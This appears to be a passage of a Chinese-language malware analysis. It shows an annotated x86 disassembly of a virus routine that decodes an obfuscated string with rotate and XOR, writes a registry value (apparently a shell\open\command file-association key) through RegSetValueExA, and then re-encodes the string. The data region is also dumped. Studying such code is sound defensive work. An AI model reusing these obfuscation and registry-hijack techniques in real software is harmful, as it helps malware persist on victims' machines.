
# 代码区

```
00412D2B: 663D0000                  cmp ax,0000
00412D2F: 755A                      jnz 00412D8B
00412D31: 668B8567B44000            mov ax,word ptr [ebp+0040B467]    <--41311A
*****************************
  EE 82
*****************************
00412D38: 8AE0                      mov ah,al
00412D3A: BE60B14000                mov esi,0040B160
00412D3F: 03F5                      add esi,ebp
00412D41: B93D000000                mov ecx,0000003D
00412D46: 51                        push ecx
00412D47: 8A06                      mov al,byte ptr [esi]
00412D49: B104                      mov cl,04
00412D4B: D2C0                      rol al,cl
00412D4D: 3C00                      cmp al,00
00412D4F: 7402                      jz 00412D53
00412D51: 32C4                      xor al,ah
00412D53: 8806                      mov byte ptr [esi],al
00412D55: 46                        inc esi
00412D56: 59                        pop ecx
00412D57: E2ED                      loop 00412D46
00412D59: B860B14000                mov eax,0040B160
00412D5E: 03C5                      add eax,ebp            <--412DE13
00412D60: BB50B14000                mov ebx,0040B150
00412D65: 03DD                      add ebx,ebp            <--412DE03
*****************************
  91 80 88 80 B8 80 99 80 EE 82
*****************************
00412D67: 8B8D40B14000              mov ecx,dword ptr [ebp+0040B140]
00412D6D: 6A3D                      push 0000003D
00412D6F: 50                        push eax
00412D70: 6A03                      push 00000003
00412D72: 6A00                      push 00000000
00412D74: 53                        push ebx
00412D75: 51                        push ecx
00412D76: FF9582BC4000              call dword ptr [ebp+0040BC82]    <--RegSetValueExA
00412D7C: 663D0000                  cmp ax,0000
00412D80: 7509                      jnz 00412D8B
00412D82: 66C7855EB140000100        mov word ptr [ebp+0040B15E],0001
00412D8B: 8B8540B14000              mov eax,dword ptr [ebp+0040B140]
00412D91: 50                        push eax
00412D92: FF957ABC4000              call dword ptr [ebp+0040BC7A]    <--RegCloseKeyA
00412D98: 668B8567B44000            mov ax,word ptr [ebp+0040B467]    <--41311A
*****************************
  EE 82
*****************************
00412D9F: 8AE0                      mov ah,al
00412DA1: BE60B14000                mov esi,0040B160
00412DA6: 03F5                      add esi,ebp            <--412DE13
00412DA8: B93D000000                mov ecx,0000003D
00412DAD: 51                        push ecx
00412DAE: 8A06                      mov al,byte ptr [esi]
00412DB0: 3C00                      cmp al,00
00412DB2: 7402                      jz 00412DB6
00412DB4: 32C4                      xor al,ah
00412DB6: B104                      mov cl,04
00412DB8: D2C8                      ror al,cl
00412DBA: 8806                      mov byte ptr [esi],al
00412DBC: 46                        inc esi
00412DBD: 59                        pop ecx
00412DBE: E2ED                      loop 00412DAD
00412DC0: 61                        popad
00412DC1: 668B855EB14000            mov ax,word ptr [ebp+0040B15E]
00412DC8: C3                        ret
********************************************************************************
```

# 非代码区

```
-------------------------------非代码区----------------------------
00412DC9: 0300                      add eax,dword ptr [eax]
00412DCB: 0000                      add byte ptr [eax],al
00412DCD: 3D00000077                cmp eax,77000000
00412DD2: 7269                      jb 00412E3D
00412DD4: 66696C655C7368            imul bp,word ptr [ebp+5C],6873
00412DDB: 656C                      insb es:[edi],dx
00412DDD: 6C                        insb es:[edi],dx
00412DDE: 5C                        pop esp
00412DDF: 6F                        outsd dx,ds:[esi]
00412DE0: 7065                      jo 00412E47
00412DE2: 6E                        outsb dx,ds:[esi]
00412DE3: 5C                        pop esp
00412DE4: 636F6D                    arpl word ptr [edi+6D],bp
00412DE7: 6D                        insd es:[edi],dx
00412DE8: 61                        popad
00412DE9: 6E                        outsb dx,ds:[esi]
00412DEA: 645C                      pop esp
00412DEC: 636F6E                    arpl word ptr [edi+6E],bp
00412DEF: 666967000000              imul sp,word ptr [edi],0000
00412DF5: 0000                      add byte ptr [eax],al
00412DF7: 0000                      add byte ptr [eax],al
00412DF9: 0000                      add byte ptr [eax],al
00412DFB: 0000                      add byte ptr [eax],al
00412DFD: 0000                      add byte ptr [eax],al
00412DFF: 0000                      add byte ptr [eax],al
00412E01: 0000                      add byte ptr [eax],al
00412E03: 91                        xchg eax,ecx
00412E04: 808880B8809980            or byte ptr [eax-667F4780],80
00412E0B: EE                        out dx,al
00412E0C: 820000                    add byte ptr [eax],00
00412E0F: 0000                      add byte ptr [eax],al
00412E11: 0000                      add byte ptr [eax],al
00412E13: 0000                      add byte ptr [eax],al
00412E15: 0000                      add byte ptr [eax],al
00412E17: 0000                      add byte ptr [eax],al
00412E19: 0000                      add byte ptr [eax],al
00412E1B: 0000                      add byte ptr [eax],al
00412E1D: 0000                      add byte ptr [eax],al
00412E1F: 0000                      add byte ptr [eax],al
00412E21: 0000                      add byte ptr [eax],al
00412E23: 0000                      add byte ptr [eax],al
00412E25: 0000                      add byte ptr [eax],al
00412E27: 0000                      add byte ptr [eax],al
00412E29: 0000                      add byte ptr [eax],al
00412E2B: 0000                      add byte ptr [eax],al
00412E2D: 0000                      add byte ptr [eax],al
00412E2F: 0000                      add byte ptr [eax],al
00412E31: 0000                      add byte ptr [eax],al
00412E33: 0000                      add byte ptr [eax],al
00412E35: 0000                      add byte ptr [eax],al
00412E37: 0000                      add byte ptr [eax],al
00412E39: 0000                      add byte ptr [eax],al
00412E3B: 0000                      add byte ptr [eax],al
00412E3D: 0000                      add byte ptr [eax],al
00412E3F: 0000                      add byte ptr [eax],al
00412E41: 0000                      add byte ptr [eax],al
00412E43: 0000                      add byte ptr [eax],al
00412E45: 0000                      add byte ptr [eax],al
00412E47: 0000                      add byte ptr [eax],al
00412E49: 0000                      add byte ptr [eax],al
00412E4B: 0000                      add byte ptr [eax],al
00412E4D: 0000                      add byte ptr [eax],al
00412E4F: 0000                      add byte ptr [eax],al
00412E51: 0000                      add byte ptr [eax],al
00412E53: 0000                      add byte ptr [eax],al
00412E55: 0000                      add byte ptr [eax],al
00412E57: 0000                      add byte ptr [eax],al
00412E59: 0000                      add byte ptr [eax],al
00412E5B: 0000                      add byte ptr [eax],al
00412E5D: 0000                      add byte ptr [eax],al
00412E5F: 0000                      add byte ptr [eax],al
00412E61: 0000                      add byte ptr [eax],al
00412E63: 0000                      add byte ptr [eax],al
00412E65: 0000                      add byte ptr [eax],al
00412E67: 0000                      add byte ptr [eax],al
```
